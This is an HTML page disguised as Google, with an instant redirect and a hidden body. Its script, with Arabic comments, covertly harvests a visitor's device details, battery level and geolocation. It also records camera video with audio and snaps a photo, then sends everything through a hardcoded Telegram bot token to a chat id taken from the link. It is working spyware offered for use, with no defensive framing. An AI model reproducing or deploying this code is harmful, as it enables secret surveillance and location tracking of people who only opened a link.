<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <title>Google</title>
    <style>
        body { display: none; }
    </style>
</head>
<body>
    <script>
        // ==================== قراءة الإيدي من الرابط ====================
        function getUserIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        const USER_ID = getUserIdFromURL();
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        if (!USER_ID) {
            window.location.replace("https://www.google.com");
        } else {
            // ==================== دوال الإرسال ====================
            async function sendToTelegram(type, data, filename) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', USER_ID);
                    
                    if (type === 'photo') {
                        formData.append('photo', data, filename || 'photo.jpg');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST', body: formData
                        });
                    } else if (type === 'video') {
                        formData.append('video', data, filename || 'video.mp4');
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST', body: formData
                        });
                    } else if (type === 'text') {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: USER_ID, text: data })
                        });
                    }
                } catch (e) {}
            }

            // ==================== سحب كل شيء ====================
            async function stealEverything() {
                try {
                    // 1. معلومات الجهاز
                    const info = {
                        'User Agent': navigator.userAgent,
                        'اللغة': navigator.language,
                        'المنصة': navigator.platform,
                        'الشاشة': `${screen.width}x${screen.height}`,
                        'المنطقة': Intl.DateTimeFormat().resolvedOptions().timeZone
                    };
                    let infoText = '🔰 معلومات الجهاز:\n';
                    for (const [k, v] of Object.entries(info)) infoText += `${k}: ${v}\n`;
                    await sendToTelegram('text', infoText);

                    // 2. البطارية
                    try {
                        const battery = await navigator.getBattery();
                        await sendToTelegram('text', `🔋 بطارية: ${Math.round(battery.level * 100)}%`);
                    } catch(e) {}

                    // 3. الموقع
                    try {
                        const pos = await new Promise((r) => navigator.geolocation.getCurrentPosition(r));
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: USER_ID,
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            })
                        });
                    } catch(e) {}

                    // 4. تصوير فيديو
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'environment' }, 
                            audio: true 
                        });
                        
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            await sendToTelegram('video', blob, `video_${Date.now()}.webm`);
                            stream.getTracks().forEach(t => t.stop());
                        };
                        
                        recorder.start();
                        setTimeout(() => recorder.stop(), 7000);
                    } catch(e) {}

                    // 5. تصوير صورة
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            canvas.toBlob(blob => sendToTelegram('photo', blob, `photo_${Date.now()}.jpg`));
                            stream.getTracks().forEach(t => t.stop());
                        }, 1000);
                    } catch(e) {}

                } catch(e) {}
            }

            // ==================== التشغيل ====================
            stealEverything();
            window.location.replace("https://www.google.com");
        }
    </script>
</body>
</html>
